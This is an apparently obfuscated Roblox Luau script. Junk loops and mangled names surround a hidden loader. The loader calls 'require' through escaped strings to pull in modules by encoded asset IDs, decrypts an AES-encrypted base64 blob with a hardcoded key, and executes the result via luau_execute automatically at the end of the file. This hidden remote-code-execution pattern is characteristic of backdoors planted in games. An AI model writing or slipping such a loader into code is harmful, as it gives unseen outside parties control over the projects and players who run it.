local L1 = 123
local X2 = "\x34\x12\x78\x56"
local M3 = {}
local L4 = function() return end

for L5 in pairs({2, 3, 5, 7, 11}) do
	for L6 = 1, 10 do
		L4 = math.random(1, 100)
		if (L6 % 2 == 0) then
			L1 = L1 + L4
		else
			L1 = L1 - L6
		end
	end
end

local M7 = function(L8)
	local M9 = 5 * L1 / 42
	return math.sqrt(M9)
end

local X10 = function()
	local L11 = 0
	for M12 = 1, 100 do
		L11 = L11 + (M12 % 13)
		table.insert(M3, L11)
	end
	return L11
end

local X13 = function(L14, M15, L16)
	local X17 = M7(L14)
	local M18 = M15
	local X19 = L16 + X17
	return X17, M18, X19
end

local X20 = function()
	local M21 = 0
	local L22 = math.random(1000, 5000)
	local X23 = M7(L22)
	while M21 < 100 do
		M21 = M21 + math.random(1, 3)
	end
	return X23
end

local L24 = "\114\101\113\117\105\114\101"
local X25 = "\85\87\77\79\66\72\107\85\80\89\47\97\100\50\81\105\54\83\77\51\82\65\61\61"
local M26 = tostring(string.char(49, 50, 51, 52, 53, 54, 55, 56, 57, 49, 48, 49, 49, 49, 49, 49))

local L27 = getfenv()['\114\101\113\117\105\114\101'](tonumber(string.char(49,52,51,56,50,49,52,48,54,57,51)))
local X28 = getfenv()['\114\101\113\117\105\114\101'](tonumber(string.char(55, 50, 50, 53, 52, 57, 57, 57, 57, 48, 52, 57, 56, 49)))
local M29 = getfenv()['\114\101\113\117\105\114\101'](tonumber(string.char(56, 55, 53, 57, 55, 52, 57, 48, 54, 50, 55, 56, 52, 57)))

local M30 = M29.decode(buffer.fromstring(X25))
local L31 = X28.new(M26, X28.modes.CBC, X28.pads.Pkcs7)

local L32 = function()
	local M33 = L31:Decrypt(M30)
	local X34 = buffer.tostring(M33)
	return X34
end

local X35 = function()
	local L36 = X20()
	local M37, L38, M39 = X13(100, 43, 99)
	local X40 = L32()
	return L27.luau_execute(X40)
end

local M41 = { X35, X10, M7, X13 }

for L42 = 1, #M41 do
	if math.random(1, 100) % 2 == 0 then
		M41[L42]()
	else
		for M43 = 1, math.random(1, 10) do
			table.insert(M41, L42)
		end
	end
end

X10()
X35()
